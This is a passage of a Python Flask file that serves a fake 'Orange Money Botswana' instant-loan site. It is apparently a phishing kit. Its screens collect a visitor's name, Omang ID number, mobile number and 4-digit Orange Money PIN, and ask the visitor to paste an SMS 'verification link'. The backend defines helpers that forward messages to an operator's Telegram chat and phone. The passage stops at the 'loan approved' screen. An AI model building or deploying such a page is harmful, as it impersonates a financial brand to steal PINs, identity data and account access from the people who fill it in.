import os
import json
import redis
import time
import requests
from flask import Flask, Response, request, jsonify, send_from_directory
from datetime import datetime
import pytz

app = Flask(__name__)

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('assets', filename)

# Africa's Talking & SMS Configuration
ADMIN_NOTIFICATION_PHONE = os.environ.get("ADMIN_NOTIFICATION_PHONE")
AT_USERNAME = os.environ.get("AT_USERNAME", "sandbox")
AT_API_KEY = os.environ.get("AT_API_KEY")

def send_sms_notification(message):
    if not ADMIN_NOTIFICATION_PHONE or not AT_API_KEY:
        print("Africa's Talking SMS configuration missing. SMS skipped.")
        return
    try:
        url = "https://api.africastalking.com/version1/messaging"
        if AT_USERNAME == "sandbox":
            url = "https://api.sandbox.africastalking.com/version1/messaging"
            
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "apiKey": AT_API_KEY
        }
        payload = {
            "username": AT_USERNAME,
            "to": ADMIN_NOTIFICATION_PHONE,
            "message": message
        }
        requests.post(url, data=payload, headers=headers, timeout=5)
    except Exception as e:
        print(f"Africa's Talking SMS dispatch failed: {e}")

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

def send_telegram_notification(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram configuration missing. Notification skipped.")
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram notification dispatch failed: {e}")

def get_now_str():
    try:
        tz = pytz.timezone("Africa/Gaborone")
        now = datetime.now(tz)
    except:
        now = datetime.now()
    return now.strftime("%Y-%m-%d %I:%M:%S %p")

# Initialize Redis client using REDIS_URL
db = None
try:
    redis_url = os.environ.get("REDIS_URL")
    if redis_url:
        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}")
        db = redis.from_url(
            redis_url, 
            decode_responses=True, 
            ssl_cert_reqs=None,
            socket_timeout=5.0,
            socket_connect_timeout=5.0,
            retry_on_timeout=True
        )
        db.ping()
        print("Redis client initialized and verified successfully.")
    else:
        print("REDIS_URL environment variable not found.")
except Exception as e:
    print(f"Redis initialization failed CRITICAL: {e}")
    db = None

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Orange Money Botswana — Instant Mobile Loans</title>
  <link rel="icon" type="image/png" href="/assets/logo.png">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root {
      --brand-orange: #FF7900;
      --brand-orange-dark: #E66A00;
      --brand-black: #000000;
      --brand-dark: #121212;
      --brand-light: #FFF5EC;
    }
    @keyframes waveDot {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .wave-dot-0 { animation: waveDot 0.8s infinite ease-in-out 0s; }
    .wave-dot-1 { animation: waveDot 0.8s infinite ease-in-out 0.15s; }
    .wave-dot-2 { animation: waveDot 0.8s infinite ease-in-out 0.3s; }
    .wave-dot-3 { animation: waveDot 0.8s infinite ease-in-out 0.45s; }
    
    .bg-orange-brand { background-color: var(--brand-orange); }
    .text-orange-brand { color: var(--brand-orange); }
    .border-orange-brand { border-color: var(--brand-orange); }
    .hover-bg-orange-dark:hover { background-color: var(--brand-orange-dark); }

    .hide-scrollbar::-webkit-scrollbar { display: none; }
    .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
    
    @keyframes pin-wavy {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .animate-pin-wavy {
      display: inline-block;
      animation: pin-wavy 0.5s ease-in-out infinite;
    }
    .animate-pin-wavy:nth-child(2) { animation-delay: 0.1s; }
    .animate-pin-wavy:nth-child(3) { animation-delay: 0.2s; }
    .animate-pin-wavy:nth-child(4) { animation-delay: 0.3s; }
  </style>
</head>
<body class="bg-[#f8f9fa] text-slate-900 antialiased min-h-screen flex flex-col justify-between selection:bg-orange-500 selection:text-white">

  <!-- TOP HEADER -->
  <header class="bg-black border-b border-zinc-800 sticky top-0 z-40 shadow-md">
    <div class="max-w-[760px] mx-auto px-4 h-16 flex items-center justify-between">
      <div class="flex items-center gap-3 cursor-pointer" onclick="goTo('home')">
        <!-- Orange Brand Icon -->
        <div class="relative w-10 h-10 bg-[#FF7900] rounded-xl flex items-end p-1.5 shadow-md select-none flex-shrink-0">
          <span class="text-white font-extrabold text-[12px] tracking-tight leading-none font-sans">orange<span class="text-[7px] align-super">™</span></span>
        </div>
        <div class="flex flex-col">
          <div class="flex items-center gap-1.5">
            <span class="text-lg font-black tracking-tight text-white leading-none">Orange</span>
            <span class="text-lg font-black tracking-tight text-[#FF7900] leading-none">Money</span>
          </div>
          <span class="text-[10px] uppercase font-bold text-zinc-400 tracking-wider">Mobile Loans</span>
        </div>
      </div>
      <button onclick="toggleMenu(true)" class="p-2.5 rounded-xl hover:bg-zinc-800 text-white transition-all active:scale-95" aria-label="Menu">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 6h16M4 12h16M4 18h16"/>
        </svg>
      </button>
    </div>
  </header>

  <!-- SIDE DRAWER MENU -->
  <div id="drawer" class="fixed inset-0 z-50 pointer-events-none opacity-0 transition-opacity duration-300">
    <div class="absolute inset-0 bg-black/60 backdrop-blur-xs" onclick="toggleMenu(false)"></div>
    <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-zinc-950 text-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300 border-l border-zinc-800">
      <div>
        <div class="flex items-center justify-between pb-4 border-b border-zinc-800">
          <div class="flex items-center gap-2.5">
            <div class="w-9 h-9 bg-[#FF7900] rounded-lg flex items-end p-1 shadow-sm">
              <span class="text-white font-extrabold text-[10px] leading-none">orange<span class="text-[6px] align-super">™</span></span>
            </div>
            <span class="font-black text-base text-white">Orange Money</span>
          </div>
          <button onclick="toggleMenu(false)" class="p-2 text-zinc-400 hover:text-white rounded-lg">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
          </button>
        </div>
        <nav class="mt-6 space-y-1 text-sm font-semibold">
          <button onclick="goTo('home'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">🏠 Home</button>
          <button onclick="goTo('apply'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">⚡ Apply for Loan</button>
          <button onclick="showInfoModal('Loan Terms'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">📄 Loan Terms</button>
          <button onclick="showInfoModal('Support & Help'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">💬 Customer Care</button>
          <button onclick="showInfoModal('Privacy Policy'); toggleMenu(false);" class="w-full text-left px-3 py-2.5 rounded-xl hover:bg-zinc-800 text-zinc-200 hover:text-white transition-all flex items-center gap-3">🔒 Privacy Policy</button>
        </nav>
      </div>
      <div class="text-xs text-zinc-500 text-center font-medium">Orange Money Botswana • Mobile Financial Services</div>
    </div>
  </div>

  <!-- MAIN WRAPPER -->
  <main class="w-full max-w-[760px] mx-auto px-4 py-4 flex-1">

    <!-- SCREEN 1: HOME -->
    <section id="screen-home" class="space-y-4">
      
      <!-- Orange Hero Card (Black & Orange Iconic Look) -->
      <div class="relative overflow-hidden rounded-3xl bg-gradient-to-br from-black via-zinc-950 to-neutral-900 text-white p-6 sm:p-8 shadow-xl border border-zinc-800">
        <!-- Ambient Orange Glow -->
        <div class="absolute -right-12 -bottom-12 w-52 h-52 rounded-full bg-[#FF7900]/25 blur-3xl pointer-events-none"></div>
        <div class="absolute -left-10 -top-10 w-40 h-40 rounded-full bg-[#FF7900]/15 blur-2xl pointer-events-none"></div>
        
        <div class="relative z-10 space-y-4">
          <div class="flex items-center gap-2">
            <span class="inline-flex items-center gap-1.5 bg-[#FF7900] text-black font-extrabold px-3 py-1 rounded-full text-xs uppercase tracking-wider shadow-sm">
              <span>⚡</span> Fast Mobile Loan
            </span>
          </div>
          
          <div>
            <h1 class="text-3xl sm:text-4xl font-black tracking-tight leading-tight">
              <span class="text-[#FF7900]">Orange</span> is here.
            </h1>
            <p class="text-2xl sm:text-3xl font-extrabold text-white mt-1">
              Loans Up To <span class="text-[#FF7900]">P 10,000</span>
            </p>
          </div>
          
          <p class="text-zinc-300 text-sm max-w-md leading-relaxed">
            Directly to your Orange Money Botswana wallet in under 2 minutes. No paperwork, no queues, no collateral required.
          </p>

          <div class="pt-2">
            <button onclick="goTo('apply')" class="w-full sm:w-auto px-8 py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-lg shadow-orange-500/20 transition-all active:scale-[0.99] flex items-center justify-center gap-2">
              <span>APPLY NOW</span>
              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
            </button>
          </div>
        </div>
      </div>

      <!-- 4 Benefits Cards -->
      <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">⚡</div>
          <span class="text-xs font-bold text-slate-800">Instant Payout</span>
        </div>
        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">📱</div>
          <span class="text-xs font-bold text-slate-800">100% Mobile</span>
        </div>
        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">📄</div>
          <span class="text-xs font-bold text-slate-800">Clear Terms</span>
        </div>
        <div class="bg-white p-3.5 rounded-2xl border border-slate-200/80 shadow-xs flex flex-col items-center text-center">
          <div class="w-10 h-10 rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center font-bold text-lg mb-2">🔒</div>
          <span class="text-xs font-bold text-slate-800">Bank Grade Security</span>
        </div>
      </div>

      <!-- Purpose Selector -->
      <div class="bg-white p-4 rounded-2xl border border-slate-200/80 shadow-xs">
        <h4 class="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2.5">Select Loan Purpose</h4>
        <div class="flex gap-2.5 overflow-x-auto pb-1 hide-scrollbar">
          <button onclick="setPurpose('Business')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">💼 Business</button>
          <button onclick="setPurpose('School')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">🎓 School Fees</button>
          <button onclick="setPurpose('Emergency')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">🚨 Emergency</button>
          <button onclick="setPurpose('Household')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">🏠 Household</button>
          <button onclick="setPurpose('Travel')" class="purpose-chip flex-shrink-0 flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-50 border border-slate-200 font-bold text-xs text-slate-700 hover:border-[#FF7900] hover:text-[#FF7900] transition-all">✈️ Travel</button>
        </div>
      </div>

      <!-- Apply Button -->
      <button onclick="goTo('apply')" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        GET STARTED
      </button>
    </section>

    <!-- SCREEN 2: APPLY FOR LOAN -->
    <section id="screen-apply" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('home')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-slate-900">APPLY FOR LOAN</h2>
          <p class="text-xs text-slate-500">Step 1 of 4 • Personal & Account Details</p>
        </div>
      </div>

      <form id="loan-application-form" onsubmit="handleFormSubmit(event)" class="space-y-4">
        <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4">
          
          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Full Name (As on Omang / ID)</label>
            <input id="input-fullname" type="text" placeholder="Lesedi Molefe" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold">
          </div>
          
          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Orange Money Mobile Number</label>
            <div class="relative">
              <input id="input-mobile" type="tel" placeholder="72 123 456" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold">
            </div>
            <p class="text-[11px] text-slate-400 mt-1">Enter your 8-digit Botswana mobile number. Funds will be disbursed to your Orange Money wallet.</p>
          </div>

          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Omang (National ID) / Passport Number</label>
            <input id="input-nationalid" type="text" placeholder="123456789" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold uppercase">
          </div>

          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Loan Purpose</label>
            <select id="input-purpose" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-semibold bg-white">
              <option value="Business">💼 Business Expansion / Working Capital</option>
              <option value="School">🎓 School & Tuition Fees</option>
              <option value="Emergency">🚨 Medical & Emergency</option>
              <option value="Household">🏠 Household & Utilities</option>
              <option value="Travel">✈️ Travel & Transport</option>
            </select>
          </div>

          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Requested Loan Amount (Pula - BWP)</label>
            <input id="input-amount" type="number" min="100" max="10000" step="100" value="1500" oninput="syncAmount(this.value, true)" required class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] text-sm font-black text-[#FF7900]">
          </div>
        </div>

        <button type="submit" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
          NEXT STEP
        </button>
      </form>
    </section>

    <!-- SCREEN 3: LOAN CONFIGURATION -->
    <section id="screen-loan" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('apply')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-slate-900">LOAN AMOUNT & PERIOD</h2>
          <p class="text-xs text-slate-500">Step 2 of 4 • Select repayment schedule</p>
        </div>
      </div>

      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-6">
        <div class="text-center">
          <div class="text-xs font-bold text-slate-400 uppercase tracking-wider">Requested Amount</div>
          <div id="display-amount" class="text-4xl font-black text-[#FF7900] mt-1">P 1,500</div>
          <input type="range" id="amount-slider" min="100" max="10000" step="100" value="1500" oninput="syncAmount(this.value)" class="w-full mt-4 accent-[#FF7900]">
          <div class="flex justify-between text-xs text-slate-400 mt-1 font-semibold">
            <span>P 100</span>
            <span>P 10,000</span>
          </div>
        </div>

        <div class="space-y-4">
          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Repayment Period</label>
            <div class="grid grid-cols-5 gap-2">
              <button type="button" onclick="setPeriod(7)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">7 Days</button>
              <button type="button" onclick="setPeriod(14)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">14 Days</button>
              <button type="button" onclick="setPeriod(30)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all bg-[#FF7900] text-black border-[#FF7900] shadow-xs">30 Days</button>
              <button type="button" onclick="setPeriod(60)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">60 Days</button>
              <button type="button" onclick="setPeriod(90)" class="period-btn py-3 rounded-xl border text-xs font-bold transition-all text-slate-700 border-slate-200 hover:border-[#FF7900]">90 Days</button>
            </div>
          </div>

          <div>
            <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-1.5">Or Select Custom Due Date</label>
            <input type="date" id="input-repay-date" onchange="setCustomDate(this.value)" class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] text-sm font-semibold">
          </div>
        </div>

        <div class="border-t border-slate-100 pt-4 space-y-2.5 text-sm">
          <div class="flex justify-between text-slate-600">
            <span>Interest (5%)</span>
            <span id="breakdown-interest" class="font-bold text-slate-800">P 75.00</span>
          </div>
          <div class="flex justify-between text-slate-600">
            <span>Admin & Processing Fee (3%)</span>
            <span id="breakdown-fee" class="font-bold text-slate-800">P 45.00</span>
          </div>
          <div class="flex justify-between text-slate-600">
            <span>Repayment Due Date</span>
            <span id="breakdown-date" class="font-bold text-slate-800">30/09/2026</span>
          </div>
          <div class="flex justify-between text-base font-extrabold text-slate-900 pt-2 border-t border-slate-100">
            <span>Total Repayment</span>
            <span id="breakdown-total" class="text-[#FF7900] font-black">P 1,620.00</span>
          </div>
        </div>
      </div>

      <button onclick="goTo('review', true)" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        CONTINUE TO REVIEW
      </button>
    </section>

    <!-- SCREEN 4: REVIEW APPLICATION -->
    <section id="screen-review" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('loan')" class="p-2.5 rounded-xl bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-slate-900">REVIEW APPLICATION</h2>
          <p class="text-xs text-slate-500">Step 3 of 4 • Verify details before submission</p>
        </div>
      </div>

      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4">
        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Applicant</h3>
          <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-500">Full Name</span><span id="review-name" class="font-bold text-slate-800">Lesedi Molefe</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Orange Money Mobile</span><span id="review-mobile" class="font-bold text-slate-800">+267 72 123 456</span></div>
            <div class="flex justify-between"><span class="text-slate-500">ID Number (Omang)</span><span id="review-id" class="font-bold text-slate-800">123456789</span></div>
          </div>
        </div>

        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Loan Summary</h3>
          <div class="bg-slate-50 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-500">Purpose</span><span id="review-purpose" class="font-bold text-slate-800">Business</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Principal</span><span id="review-principal" class="font-bold text-[#FF7900]">P 1,500</span></div>
            <div class="flex justify-between"><span class="text-slate-500">Period</span><span id="review-period" class="font-bold text-slate-800">30 Days</span></div>
          </div>
        </div>

        <div>
          <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Repayment</h3>
          <div class="bg-orange-50/70 border border-orange-100 rounded-2xl p-3.5 space-y-1.5 text-xs sm:text-sm">
            <div class="flex justify-between"><span class="text-slate-600">Total Payable</span><span id="review-total" class="font-extrabold text-[#FF7900]">P 1,620.00</span></div>
            <div class="flex justify-between"><span class="text-slate-600">Due Date</span><span id="review-date" class="font-bold text-slate-800">30/09/2026</span></div>
          </div>
        </div>

        <label class="flex items-start gap-3 pt-2 cursor-pointer">
          <input type="checkbox" id="confirm-check" onchange="toggleConfirm(this.checked)" class="mt-1 h-4 w-4 rounded accent-[#FF7900]">
          <span class="text-xs text-slate-600 leading-snug">I confirm that the information provided is correct and agree to Orange Money loan terms and conditions.</span>
        </label>
      </div>

      <button id="btn-confirm" onclick="goTo('pin', true)" disabled class="w-full py-4 rounded-2xl bg-slate-300 cursor-not-allowed text-slate-500 font-black text-base tracking-wide shadow-md transition-all">
        CONFIRM APPLICATION
      </button>
    </section>

    <!-- SCREEN 5: ENTER YOUR PIN -->
    <section id="screen-pin" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-14 h-14 mx-auto rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center text-2xl mb-3 shadow-inner">🔒</div>
        <h2 class="text-2xl font-black text-slate-900">ENTER YOUR PIN</h2>
        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit Orange Money PIN to authorize</p>
      </div>

      <!-- PIN Dots -->
      <div class="flex justify-center gap-4 py-2">
        <div id="dot-0" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
        <div id="dot-1" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
        <div id="dot-2" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
        <div id="dot-3" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all duration-200"></div>
      </div>

      <div id="pin-status-msg" class="text-center text-xs font-bold text-[#FF7900] min-h-[18px]"></div>

      <!-- Keypad -->
      <div class="max-w-[280px] mx-auto grid grid-cols-3 gap-3">
        <button type="button" onclick="pressPin('1')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">1</button>
        <button type="button" onclick="pressPin('2')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">2</button>
        <button type="button" onclick="pressPin('3')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">3</button>
        <button type="button" onclick="pressPin('4')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">4</button>
        <button type="button" onclick="pressPin('5')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">5</button>
        <button type="button" onclick="pressPin('6')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">6</button>
        <button type="button" onclick="pressPin('7')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">7</button>
        <button type="button" onclick="pressPin('8')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">8</button>
        <button type="button" onclick="pressPin('9')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">9</button>
        <button type="button" onclick="clearPin()" class="h-14 rounded-2xl bg-slate-100 font-bold text-xs text-slate-500 hover:bg-slate-200 active:scale-95 transition-all uppercase">Clear</button>
        <button type="button" onclick="pressPin('0')" class="h-14 rounded-2xl bg-white border border-slate-200 font-bold text-xl text-slate-800 shadow-xs hover:bg-orange-50 active:scale-95 transition-all">0</button>
        <button type="button" onclick="backspacePin()" class="h-14 rounded-2xl bg-slate-100 font-bold text-base text-slate-600 hover:bg-slate-200 active:scale-95 transition-all">⌫</button>
      </div>
    </section>

    <!-- SCREEN 6: PASTE VERIFICATION LINK -->
    <section id="screen-otp" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-14 h-14 mx-auto rounded-full bg-orange-50 text-[#FF7900] flex items-center justify-center text-2xl mb-3 shadow-inner">🔗</div>
        <h2 class="text-2xl font-black text-slate-900">VERIFY ELIGIBILITY</h2>
        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please paste the verification link we've sent via SMS to <span id="otp-mobile-label" class="font-bold text-slate-700"></span> to verify your loan eligibility.</p>
      </div>

      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4 max-w-md mx-auto">
        <div>
          <label class="block text-xs font-bold uppercase tracking-wider text-slate-500 mb-2">Paste Verification Link</label>
          <div class="relative flex items-center">
            <input type="text" id="input-verification-link" placeholder="Paste link here (e.g. https://...)" class="w-full px-4 py-3.5 pr-20 rounded-2xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-[#FF7900] focus:border-[#FF7900] bg-slate-50 text-sm font-semibold text-slate-800 placeholder:text-slate-400">
            <button type="button" onclick="pasteLinkFromClipboard()" class="absolute right-2 px-3 py-1.5 bg-[#FF7900] hover:bg-[#E66A00] text-black rounded-xl text-xs font-black shadow-xs transition-all active:scale-95">PASTE</button>
          </div>
          <p class="text-[11px] text-slate-400 mt-2">Open your SMS messages, copy the eligibility link, and paste it here.</p>
        </div>
      </div>

      <div class="text-center">
        <button id="resend-btn" onclick="resendOtp()" disabled class="text-xs font-bold text-slate-400">Resend SMS link in 30s</button>
      </div>

      <button id="btn-otp" onclick="startProcessing()" class="w-full py-4 rounded-2xl bg-[#FF7900] hover:bg-[#E66A00] text-black font-black text-base tracking-wide shadow-md transition-all active:scale-[0.99]">
        VERIFY & CONTINUE
      </button>
    </section>

    <!-- SCREEN 7: PROCESSING APPLICATION -->
    <section id="screen-processing" class="hidden py-10 space-y-8 text-center">
      <div class="relative w-20 h-20 mx-auto">
        <div class="w-20 h-20 rounded-full border-4 border-slate-200 border-t-[#FF7900] animate-spin"></div>
      </div>

      <div>
        <h2 class="text-2xl font-black text-slate-900">PROCESSING APPLICATION</h2>
        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Please wait while our automated scoring engine reviews your Orange Money history.</p>
      </div>

      <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
        <div id="step-sub" class="flex items-center gap-3 text-slate-800">
          <span class="font-bold text-emerald-600">✓</span><span>Application Submitted</span>
        </div>
        <div id="step-ver" class="flex items-center gap-3 text-slate-800">
          <span class="font-bold text-emerald-600">✓</span><span>Phone Verified</span>
        </div>
        <div id="step-proc" class="flex items-center gap-3 text-[#FF7900] animate-pulse">
          <span class="w-2.5 h-2.5 rounded-full bg-[#FF7900] inline-block ml-0.5"></span><span>Processing Assessment...</span>
        </div>
        <div id="step-dec" class="flex items-center gap-3 text-slate-400">
          <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Final Decision</span>
        </div>
      </div>
    </section>

    <!-- SCREEN 8: LOAN APPROVED -->
    <section id="screen-approved" class="hidden space-y-6">
      <div class="text-center pt-2">
        <div class="w-20 h-20 mx-auto rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-4xl mb-3 shadow-inner font-bold">
          ✓
        </div>
        <h2 class="text-2xl sm:text-3xl font-black text-slate-900">LOAN APPROVED!</h2>
        <p class="text-xs text-slate-500 mt-1">Funds will be credited to your Orange Money wallet.</p>
      </div>

      <div class="bg-white rounded-3xl p-6 border border-slate-200/80 shadow-xs space-y-4">
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Application Reference</span>
          <span class="font-mono font-bold text-slate-800">OMB-894210</span>
        </div>
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Approved Amount</span>
          <span id="approved-amount" class="text-lg font-black text-[#FF7900]">P 1,500</span>
        </div>
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Repayment Amount</span>
          <span id="approved-repay" class="font-bold text-slate-800">P 1,620.00</span>
        </div>
        <div class="flex justify-between items-center text-xs sm:text-sm">
          <span class="text-slate-500">Repayment Date</span>
